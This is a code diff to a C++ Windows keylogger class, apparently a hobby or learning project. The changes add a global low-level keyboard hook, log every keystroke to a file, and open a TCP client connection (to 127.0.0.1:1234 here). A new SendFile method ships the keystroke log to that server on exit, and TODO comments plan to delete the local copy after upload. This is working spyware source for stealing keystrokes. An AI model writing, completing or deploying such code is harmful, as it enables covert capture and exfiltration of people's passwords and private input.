@@ -1,12 +1,28 @@
-#include <iostream>
+
 #include"../lib/Keylogger.hpp"
 
 
 Keylogger* Keylogger::instance = nullptr;
 
-Keylogger::Keylogger(const std::string& filename)  : fileHandler(filename) {
-    instance = this;
+Keylogger* Keylogger::getInstance(const std::string& filename) {
+    if (!instance) {
+        instance = new Keylogger(filename);
+    }
+    return instance;
 }
+
+Keylogger::Keylogger(const std::string& filename)  : fileHandler(filename), client("127.0.0.1", 1234) {
+    instance = this;
+
+    if (!client.connectToServer()) {
+        std::cerr << "Failed to connect to server!" << std::endl;
+    }
+}
+
+Keylogger::~Keylogger() {
+    UninstallHook();
+}
+
 
 
 LRESULT CALLBACK Keylogger::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
@@ -18,7 +34,7 @@ LRESULT CALLBACK Keylogger::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam
 
             if(instance) {
                 std::cout << "Key Pressed: " << key << std::endl;
-                instance->fileHandler.writeFile(std::string(key));  // Send to server
+                instance->fileHandler.writeFile(std::string(key));  // Write in the file and send the file to server.
             }
         }
     }
@@ -27,7 +43,7 @@ LRESULT CALLBACK Keylogger::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam
 }
 
 void Keylogger::InstallHook() {
-    hook - SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
+    hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
     if (!hook) {
         std::cerr << "Failed to install hook!\n";
     }
@@ -41,6 +57,25 @@ void Keylogger::UninstallHook() {
     }
 }
 
+void Keylogger::SendFile() {
+    std::string fileContent = fileHandler.readFile();
+    //Check the content of the file.
+    if (fileContent.empty()) return;
+
+    //Notify the server
+    if (!client.sendData("SEND_FILE")) return;
+
+    //Send the data
+    if (!client.sendData(fileContent)) {
+        std::cerr << "Failed to send log file!" << std::endl;
+    } else {
+        std::cout << "Log file sent successfully!" << std::endl;
+    }
+
+}
+
+//TODO Update the method to send the txt file to the server afyer the 'quit' key is pressed
+//TODO Update the method to delete the file from the client after it sent it to the server
 void Keylogger::Run() {
     InstallHook();
     std::cout << "Press ESC to exit." << std::endl;
@@ -54,6 +89,7 @@ void Keylogger::Run() {
             DispatchMessage(&msg);
         }
         if (GetAsyncKeyState(VK_ESCAPE)) {
+            SendFile();
             break;
         }
     }
